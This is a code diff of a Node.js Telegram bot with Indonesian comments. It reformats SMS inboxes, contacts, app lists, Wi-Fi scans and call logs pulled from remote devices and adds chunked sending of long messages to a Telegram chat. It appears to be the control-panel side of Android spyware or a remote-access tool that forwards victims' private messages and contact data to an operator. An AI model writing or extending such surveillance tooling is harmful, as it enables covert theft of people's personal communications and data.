@@ -158,41 +158,41 @@ const notifyDeviceSync = async (deviceId) => {
 
 const formatDeviceResponse = (fullData) => {
     if (!fullData) return '\n└ [Kosong]';
-    const type = fullData.type;
+    const type = String(fullData.type || fullData.command || '').toLowerCase();
     const data = fullData.data;
 
     if (data === null || data === undefined) return '\n└ [Kosong]';
 
     // String default (untuk pesan sukses/error sederhana)
-    if (typeof data === 'string' && !['sms_inbox', 'sms_list', 'contacts_list', 'app_list', 'wifi_networks', 'wifi_scan', 'call_logs'].includes(type)) {
+    if (typeof data === 'string' && !['sms_inbox', 'sms_list', 'contacts_list', 'app_list', 'wifi_networks', 'wifi_scan', 'call_logs', 'get_call_logs', 'contacts'].includes(type)) {
         return `\n└ <code>${escapeHTML(data)}</code>`;
     }
 
     // SMS Inbox / SMS List
     if (['sms_inbox', 'sms_list'].includes(type) && Array.isArray(data)) {
-        return '\n' + data.slice(0, 50).map((sms, i) => {
+        return '\n' + data.slice(0, 40).map((sms, i) => {
             const sender = sms.from || sms.address || 'Unknown';
-            const body = sms.body || sms.message || '';
+            const body = (sms.body || sms.message || '').substring(0, 150);
             return `${i + 1}. 📩 <b>${escapeHTML(sender)}</b>\n   └ ${escapeHTML(body)}`;
         }).join('\n\n');
     }
 
     // Contact List
-    if ((type === 'contacts_list' || type === 'contacts') && Array.isArray(data)) {
-        return '\n' + data.slice(0, 50).map((c, i) => {
+    if (['contacts_list', 'contacts'].includes(type) && Array.isArray(data)) {
+        return '\n' + data.slice(0, 80).map((c, i) => {
             return `${i + 1}. 👤 <b>${escapeHTML(c.name || 'Unknown')}</b>\n   └ 📞 <code>${escapeHTML(c.number || c.phone || '-')}</code>`;
         }).join('\n\n');
     }
 
     // App List
-    if (type === 'app_list' && Array.isArray(data)) {
+    if (['app_list', 'apps'].includes(type) && Array.isArray(data)) {
         return '\n' + data.slice(0, 100).map((app, i) => {
             return `${i + 1}. 📦 <b>${escapeHTML(app.name)}</b>\n   └ 🏷 <code>${escapeHTML(app.package)}</code>`;
         }).join('\n');
     }
 
     // WiFi List (Filtered & Clean)
-    if ((type === 'wifi_networks' || type === 'wifi_scan') && Array.isArray(data)) {
+    if (['wifi_networks', 'wifi_scan'].includes(type) && Array.isArray(data)) {
         const unique = [];
         const ssids = new Set();
         [...data].sort((a, b) => (b.level || 0) - (a.level || 0)).forEach(w => {
@@ -210,10 +210,10 @@ const formatDeviceResponse = (fullData) => {
     }
 
     // Call Logs
-    if (type === 'call_logs' && Array.isArray(data)) {
+    if (['call_logs', 'get_call_logs'].includes(type) && Array.isArray(data)) {
         return '\n' + data.slice(0, 50).map((call, i) => {
             const icon = call.type === 'incoming' ? '📥' : (call.type === 'outgoing' ? '📤' : (call.type === 'missed' ? '❌' : '📞'));
-            return `${i + 1}. ${icon} <b>${escapeHTML(call.name || call.number)}</b>\n   └ ⏱ ${call.duration} | � ${new Date(call.date).toLocaleString('id-ID')}`;
+            return `${i + 1}. ${icon} <b>${escapeHTML(call.name || call.number)}</b>\n   └ ⏱ ${call.duration} | 📅 ${new Date(parseInt(call.date)).toLocaleString('id-ID')}`;
         }).join('\n\n');
     }
 
@@ -238,6 +238,40 @@ const formatDeviceResponse = (fullData) => {
     }
 
     return `\n└ <code>${escapeHTML(data)}</code>`;
+};
+
+/**
+ * Mengirim pesan ke Telegram dengan memecah pesan besar menjadi beberapa bagian (chunking)
+ * untuk menghindari error "message is too long" (4096 char limit)
+ */
+const sendMessageChunked = async (chatId, text, options = {}) => {
+    if (!bot || !chatId) return;
+    const MAX_LENGTH = 4000;
+    if (text.length <= MAX_LENGTH) {
+        return await bot.telegram.sendMessage(chatId, text, { parse_mode: 'HTML', ...options });
+    }
+
+    const lines = text.split('\n');
+    let currentChunk = '';
+    let part = 1;
+    const totalLines = lines.length;
+
+    for (let i = 0; i < totalLines; i++) {
+        const line = lines[i] + '\n';
+        if ((currentChunk + line).length > MAX_LENGTH) {
+            const header = part > 1 ? `<i>(Lanjutan Bag. ${part})...</i>\n` : '';
+            await bot.telegram.sendMessage(chatId, header + currentChunk, { parse_mode: 'HTML', ...options });
+            currentChunk = line;
+            part++;
+        } else {
+            currentChunk += line;
+        }
+    }
+
+    if (currentChunk) {
+        const header = part > 1 ? `<i>(Bag. Akhir)...</i>\n` : '';
+        await bot.telegram.sendMessage(chatId, header + currentChunk, { parse_mode: 'HTML', ...options });
+    }
 };
 
 // State Memori
